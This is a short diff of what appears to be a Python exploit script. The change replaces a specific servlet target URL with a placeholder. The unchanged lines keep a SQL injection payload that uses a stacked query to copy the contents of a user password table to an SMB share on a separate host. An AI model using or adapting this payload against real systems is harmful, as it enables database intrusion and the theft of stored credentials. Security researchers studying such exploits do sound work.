@@ -21,7 +21,7 @@ def makerequest(target,payload):
             message('Not getdata file')
 
 def main():
-    target='https://mn:8443/servlet/AMUserResourcesSyncServlet'
+    target='https://Target/Sqli'
     payload=';copy (select * from am_userpasswordtable) to $$\\\\192.168.119.145\\share\\getdata.txt$$;'
     makerequest(target,payload)
 
